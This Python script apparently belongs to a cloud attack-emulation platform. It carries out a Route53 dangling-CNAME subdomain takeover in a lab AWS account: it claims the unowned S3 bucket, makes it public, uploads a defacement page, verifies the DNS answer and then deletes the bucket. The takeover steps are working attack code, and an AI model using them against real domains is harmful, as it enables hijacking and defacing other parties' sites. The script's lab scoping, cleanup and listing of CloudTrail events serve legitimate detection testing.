"""
# FILE: attack.py
ATOMIC_ROUTE53_DANGLING_RECORD - Automated Attack Script
T1491.002 External Defacement via Route53 Dangling CNAME Subdomain Takeover

Attack phases:
  Phase 1 - Enumerate Route53 zones, discover the dangling CNAME pointing to an unclaimed S3 endpoint
  Phase 2 - Claim the S3 endpoint, configure website hosting, upload defacement page, verify via TestDNSAnswer
  Phase 3 - Revert: delete attacker-created bucket, restoring the dangling condition

Entry point: run(outputs, region)
"""
import sys
import re
import time
import random
import json
import pathlib

# Cross-platform UTF-8 output - prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError

# ── Resource names: single source of truth ──────────────────────────────────
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} - names will fall back to defaults")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json['resources']."""
    return _R.get(key, default)


def _p(outputs, semantic_key, default=""):
    """Resolve a dynamic value via pulumi_export_keys -> outputs dict -> default."""
    export_key = _PKS.get(semantic_key, semantic_key)
    return outputs.get(export_key) or default


# ── Timing helpers ─────────────────────────────────────────────────────────────
def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


# ── Output helpers ─────────────────────────────────────────────────────────────
def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


# ── Region parsing ─────────────────────────────────────────────────────────────
def parse_region_from_s3_website_hostname(hostname):
    """Extract region from s3-website endpoint hostname.

    Handles both formats:
      bucket.s3-website-REGION.amazonaws.com  (us-east-1, us-west-2, etc.)
      bucket.s3-website.REGION.amazonaws.com  (newer format for some regions)
    """
    m = re.search(r"s3-website[-.]([a-z0-9-]+)\.amazonaws\.com", hostname)
    if m:
        return m.group(1)
    return None



def _assume_attacker(region, role_arn):
    """Assume the account-root-trusted attacker role (no long-lived keys). Retries for IAM propagation."""
    base = _base_session(region)
    last = None
    for _ in range(10):
        try:
            c = base.client("sts").assume_role(RoleArn=role_arn, RoleSessionName="atomic-attacker")["Credentials"]
            return boto3.Session(aws_access_key_id=c["AccessKeyId"], aws_secret_access_key=c["SecretAccessKey"],
                                 aws_session_token=c["SessionToken"], region_name=region)
        except ClientError as e:
            last = e
            time.sleep(3)
    raise last

def run(outputs: dict, region: str = "us-east-1") -> None:
    """Execute the Route53 dangling CNAME subdomain takeover emulation.

    All credentials and dynamic values are read exclusively from `outputs`.
    Static names are resolved from resource_names.json via _r().
    """
    # ── Resolve static names from resource_names.json ────────────────────────
    _set_tenant_credentials(outputs)

    unclaimed_bucket_name   = _r("unclaimed_bucket_name",  "app-corp-victim-lab")
    dangling_record_name    = _r("dangling_record_name",   "app.corp-victim-lab.internal")
    dangling_record_target  = _r("dangling_record_target", "app-corp-victim-lab.s3-website-us-east-1.amazonaws.com")
    hosted_zone_name        = _r("hosted_zone_name",       "corp-victim-lab.internal")

    # ── Resolve dynamic values from Pulumi outputs ───────────────────────────
    attacker_role_name = _p(outputs, "attacker_role_name") or _r("attacker_role_name")
    # Exported zone ID - used to scope enumeration to the lab zone (client-account safety)
    exported_zone_id = _p(outputs, "hosted_zone_id")
    # Exported FQDN (may include trailing dot from Route53)
    exported_fqdn    = _p(outputs, "dangling_record_fqdn", dangling_record_name)

    if not attacker_role_name:
        raise RuntimeError("Missing required Pulumi output: 'attacker_role_name'.")

    # Derive bucket region from the static CNAME target value
    bucket_region = parse_region_from_s3_website_hostname(dangling_record_target)
    if not bucket_region:
        bucket_region = region

    # Normalize the dangling record FQDN (strip trailing dot if present)
    dangling_record_fqdn = exported_fqdn.rstrip(".")

    # Single attacker session reused across all phases
    _acct = _base_session(region).client("sts").get_caller_identity()["Account"]
    attacker_session = _assume_attacker(region, f"arn:aws:iam::{_acct}:role/{attacker_role_name}")

    route53 = attacker_session.client("route53")
    # S3 client targets the bucket region
    s3 = attacker_session.client("s3", region_name=bucket_region)

    # State carried across phases
    zone_id        = None
    bucket_created = False

    try:
        # ══════════════════════════════════════════════════════════════════════
        # Phase 1 - Enumerate: Discover Dangling Route53 CNAME Record
        # T1491.002 - attacker maps the DNS landscape to find an unclaimed endpoint
        # ══════════════════════════════════════════════════════════════════════
        print_step("Phase 1 - Enumerate Route53 zones and discover dangling CNAME record")

        # Step 1a: List all hosted zones in the account
        # CloudTrail: route53:ListHostedZones
        print_step("Step 1/5 [T1491.002] ListHostedZones - map account DNS zones")
        try:
            zones_resp = route53.list_hosted_zones()
            zones = zones_resp.get("HostedZones", [])
            print_ok(f"Discovered {len(zones)} hosted zone(s)")
            for z in zones:
                print(f"      Zone: {z['Name']}  Id: {z['Id']}")
        except ClientError as e:
            raise RuntimeError(f"list_hosted_zones failed: {e}")

        op_delay(2, 5)

        # Step 1b: Walk each zone's record sets; identify CNAME -> S3 website endpoint
        # CLIENT-ACCOUNT SAFETY: only process the zone exported by the lab stack.
        # If the stack exported a zone ID, restrict enumeration to that zone.
        # Never blindly take the first item from a list_* response.
        print_step(
            "Step 1b/5 [T1491.002] ListResourceRecordSets - search for S3-website CNAMEs"
        )
        for zone in zones:
            z_id   = zone["Id"]   # e.g. /hostedzone/Z0ABC123...
            z_name = zone["Name"]

            # Skip zones that don't match the lab-exported zone (client-account safety)
            if exported_zone_id:
                bare_exported = exported_zone_id.split("/")[-1]
                bare_current  = z_id.split("/")[-1]
                if bare_current != bare_exported:
                    print(f"      Skipping non-lab zone: {z_name} ({bare_current})")
                    continue

            try:
                rrs_resp = route53.list_resource_record_sets(HostedZoneId=z_id)
            except ClientError as e:
                print_err(f"list_resource_record_sets zone {z_name}: {e}")
                continue

            for rrset in rrs_resp.get("ResourceRecordSets", []):
                if rrset.get("Type") != "CNAME":
                    continue
                for rec in rrset.get("ResourceRecords", []):
                    val = rec.get("Value", "")
                    if "s3-website" not in val:
                        continue
                    record_name = rrset.get("Name", "").rstrip(".")
                    print_ok(f"Found CNAME -> S3 website: {record_name} -> {val}")
                    # Accept the record that matches our known dangling record name
                    if (
                        zone_id is None
                        and unclaimed_bucket_name in val
                    ):
                        zone_id = z_id
                        print_ok(f"  Confirmed dangling record: {record_name} -> {val}")
                        print_ok(f"  Unclaimed bucket: {unclaimed_bucket_name}")

        # Fall back to the exported zone ID if enumeration found no match
        if not zone_id:
            if exported_zone_id:
                print_err(
                    "Dangling CNAME not found via enumeration - "
                    "using exported zone ID as fallback"
                )
                zone_id = exported_zone_id
            else:
                raise RuntimeError(
                    "No dangling CNAME pointing to an S3 static-website endpoint was found "
                    "and no exported zone ID available. "
                    "Verify the infra stack is deployed and that bucket "
                    f"'{unclaimed_bucket_name}' is intentionally absent."
                )

        op_delay(2, 5)
        phase_delay()

        # ══════════════════════════════════════════════════════════════════════
        # Phase 2 - Subdomain Takeover: Claim, Deface, Verify
        # T1491.002 - attacker creates the missing bucket, serves defacement content
        # ══════════════════════════════════════════════════════════════════════
        print_step("Phase 2 - Subdomain takeover: claim unclaimed S3 endpoint")
        print_ok(f"Target bucket region (from static config): {bucket_region}")
        print_ok(f"Bucket to claim: {unclaimed_bucket_name}")

        # Step 2: Create the S3 bucket whose name matches the dangling CNAME value
        # CloudTrail: s3:CreateBucket
        print_step(
            f"Step 2/5 [T1491.002] CreateBucket - claim '{unclaimed_bucket_name}' "
            f"(endpoint previously unowned)"
        )
        try:
            if bucket_region == "us-east-1":
                # us-east-1 must NOT include CreateBucketConfiguration
                s3.create_bucket(Bucket=unclaimed_bucket_name)
            else:
                s3.create_bucket(
                    Bucket=unclaimed_bucket_name,
                    CreateBucketConfiguration={"LocationConstraint": bucket_region},
                )
            bucket_created = True
            print_ok(
                f"[OK] Bucket '{unclaimed_bucket_name}' created - "
                f"S3 static-website endpoint now attacker-owned"
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "BucketAlreadyOwnedByYou":
                print_ok("Bucket already owned by attacker (prior run) - continuing")
                bucket_created = True
            elif code == "BucketAlreadyExists":
                raise RuntimeError(
                    f"Bucket '{unclaimed_bucket_name}' is owned by a different account. "
                    "The subdomain takeover is blocked."
                )
            else:
                raise RuntimeError(f"create_bucket failed: {e}")

        op_delay(3, 6)

        # Step 3a: Disable public access block so bucket policy can grant public read
        # Required on modern S3 before a public bucket policy can be applied
        # CloudTrail: s3:PutBucketPublicAccessBlock
        print_step(
            "Step 3a/5 [T1491.002] PutPublicAccessBlock - "
            "disable block to allow public website serving"
        )
        try:
            s3.put_public_access_block(
                Bucket=unclaimed_bucket_name,
                PublicAccessBlockConfiguration={
                    "BlockPublicAcls": False,
                    "IgnorePublicAcls": False,
                    "BlockPublicPolicy": False,
                    "RestrictPublicBuckets": False,
                },
            )
            print_ok("Public access block disabled on attacker bucket")
        except ClientError as e:
            print_err(f"put_public_access_block: {e} (continuing)")

        op_delay(1, 2)

        # Step 3b: Enable S3 static website hosting
        # PutBucketWebsite is a management-plane event captured in CloudTrail
        print_step(
            "Step 3b/5 [T1491.002] PutBucketWebsite - "
            "configure static website hosting on attacker bucket"
        )
        try:
            s3.put_bucket_website(
                Bucket=unclaimed_bucket_name,
                WebsiteConfiguration={
                    "IndexDocument": {"Suffix": "index.html"},
                    "ErrorDocument": {"Key": "index.html"},
                },
            )
            print_ok("S3 static website hosting enabled on attacker bucket")
        except ClientError as e:
            raise RuntimeError(f"put_bucket_website failed: {e}")

        op_delay(1, 2)

        # Step 3c: Apply bucket policy granting public GetObject
        # Using bucket policy rather than object ACL avoids requiring
        # s3:PutBucketOwnershipControls (not granted to the attacker role).
        # CloudTrail: s3:PutBucketPolicy
        public_read_policy = json.dumps(
            {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Sid": "PublicReadDefacement",
                        "Effect": "Allow",
                        "Principal": "*",
                        "Action": "s3:GetObject",
                        "Resource": f"arn:aws:s3:::{unclaimed_bucket_name}/*",
                    }
                ],
            }
        )
        try:
            s3.put_bucket_policy(
                Bucket=unclaimed_bucket_name,
                Policy=public_read_policy,
            )
            print_ok("Public-read bucket policy applied on attacker bucket")
        except ClientError as e:
            print_err(f"put_bucket_policy: {e} (index.html uploaded but may not be publicly readable)")

        op_delay(1, 2)

        # Step 3d: Upload defacement index.html
        # PutObject is an S3 data-plane event; visible in CloudTrail only if
        # S3 data event logging is enabled on the account.
        defacement_html = (
            "<!DOCTYPE html><html>"
            "<head><title>Subdomain Takeover PoC</title></head>"
            "<body>"
            "<h1>[ATOMIC EMULATION] Subdomain Takeover via Dangling Route53 CNAME</h1>"
            "<p>This bucket was unclaimed. T1491.002 - External Defacement.</p>"
            "</body></html>"
        )
        print_step(
            "Step 3d/5 [T1491.002] PutObject - upload defacement page to attacker-claimed bucket"
        )
        try:
            s3.put_object(
                Bucket=unclaimed_bucket_name,
                Key="index.html",
                Body=defacement_html.encode("utf-8"),
                ContentType="text/html",
            )
            print_ok("Defacement index.html uploaded to attacker bucket")
        except ClientError as e:
            raise RuntimeError(f"put_object failed: {e}")

        op_delay(3, 7)

        # Step 4: Verify takeover via TestDNSAnswer
        # Confirms the CNAME still resolves to the attacker-owned bucket endpoint
        # CloudTrail: route53:TestDNSAnswer
        print_step(
            f"Step 4/5 [T1491.002] TestDNSAnswer - verify '{dangling_record_fqdn}' "
            f"still resolves to attacker bucket"
        )
        try:
            dns_resp = route53.test_dns_answer(
                HostedZoneId=zone_id,
                RecordName=dangling_record_fqdn,
                RecordType="CNAME",
            )
            response_code = dns_resp.get("ResponseCode", "UNKNOWN")
            record_data   = dns_resp.get("RecordData", [])
            print_ok(f"TestDNSAnswer response code: {response_code}")
            if record_data:
                resolved_to = record_data[0]
                print_ok(f"CNAME resolves to: {resolved_to}")
                if unclaimed_bucket_name in resolved_to:
                    print_ok(
                        f"Takeover CONFIRMED - CNAME -> attacker-owned bucket "
                        f"'{unclaimed_bucket_name}'"
                    )
                else:
                    print_err(f"CNAME target unexpected: {resolved_to}")
            else:
                print_err("TestDNSAnswer returned no record data")
        except ClientError as e:
            print_err(f"test_dns_answer: {e}")

        op_delay(2, 5)
        phase_delay()

    finally:
        # ══════════════════════════════════════════════════════════════════════
        # Phase 3 - Revert: Delete Attacker-Created Bucket
        # In a try/finally so cleanup always runs even if phases 1-2 raised.
        # Restores the dangling condition; pulumi destroy removes the DNS records.
        # ══════════════════════════════════════════════════════════════════════
        print_step("Phase 3 - Revert: delete attacker-created S3 bucket")

        if bucket_created:
            # Step 5a: Delete defacement object first (bucket must be empty before deletion)
            # CloudTrail: s3:DeleteObject (data plane - visible only with data event logging)
            print_step(
                f"Step 5a/5 [T1491.002] DeleteObject - remove index.html from '{unclaimed_bucket_name}'"
            )
            try:
                s3.delete_object(Bucket=unclaimed_bucket_name, Key="index.html")
                print_ok(f"Deleted index.html from '{unclaimed_bucket_name}'")
            except ClientError as e:
                code = e.response["Error"]["Code"]
                if code == "NoSuchKey":
                    print_ok("index.html already absent - no action needed")
                else:
                    print_err(f"delete_object index.html: {e}")

            op_delay(1, 2)

            # Step 5b: Delete the attacker-created bucket
            # CloudTrail: s3:DeleteBucket
            print_step(
                f"Step 5b/5 [T1491.002] DeleteBucket - remove attacker bucket '{unclaimed_bucket_name}'"
            )
            try:
                s3.delete_bucket(Bucket=unclaimed_bucket_name)
                print_ok(
                    f"[OK] Attacker bucket '{unclaimed_bucket_name}' deleted - "
                    f"dangling CNAME condition restored"
                )
            except ClientError as e:
                code = e.response["Error"]["Code"]
                if code == "NoSuchBucket":
                    print_ok("Bucket already absent - cleanup complete")
                elif code == "BucketNotEmpty":
                    # Defensive: enumerate and delete any residual objects, then retry
                    print_err("Bucket not empty - purging residual objects before deletion")
                    try:
                        paginator = s3.get_paginator("list_objects_v2")
                        for page in paginator.paginate(Bucket=unclaimed_bucket_name):
                            objects = [
                                {"Key": obj["Key"]}
                                for obj in page.get("Contents", [])
                            ]
                            if objects:
                                s3.delete_objects(
                                    Bucket=unclaimed_bucket_name,
                                    Delete={"Objects": objects, "Quiet": True},
                                )
                        s3.delete_bucket(Bucket=unclaimed_bucket_name)
                        print_ok(
                            f"[OK] Bucket '{unclaimed_bucket_name}' emptied and deleted"
                        )
                    except ClientError as inner_e:
                        print_err(f"Forced bucket deletion failed: {inner_e}")
                else:
                    print_err(f"delete_bucket: {e}")

            op_delay(2, 4)
        else:
            print_ok("No attacker bucket was created - nothing to clean up")

    # ── Attack summary ─────────────────────────────────────────────────────────
    print("\n" + "=" * 64)
    print("[SUMMARY] ATOMIC_ROUTE53_DANGLING_RECORD - Complete")
    print("=" * 64)
    print(f"  Technique : T1491.002 - External Defacement (Subdomain Takeover)")
    print(f"  Zone      : {hosted_zone_name}  ({zone_id})")
    print(f"  CNAME FQDN: {dangling_record_fqdn}")
    print(f"  Bucket    : {unclaimed_bucket_name}")
    print("")
    print("  CloudTrail events generated (management plane):")
    print("    route53:ListHostedZones          Phase 1 Step 1")
    print("    route53:ListResourceRecordSets   Phase 1 Step 1b")
    print("    s3:CreateBucket                  Phase 2 Step 2")
    print("    s3:PutBucketPublicAccessBlock    Phase 2 Step 3a")
    print("    s3:PutBucketWebsite              Phase 2 Step 3b")
    print("    s3:PutBucketPolicy               Phase 2 Step 3c")
    print("    route53:TestDNSAnswer            Phase 2 Step 4")
    print("    s3:DeleteBucket                  Phase 3 Step 5b")
    print("")
    print("  Data-plane events (visible only with S3 data event logging):")
    print("    s3:PutObject  index.html          Phase 2 Step 3d")
    print("    s3:DeleteObject index.html        Phase 3 Step 5a")
    print("=" * 64)
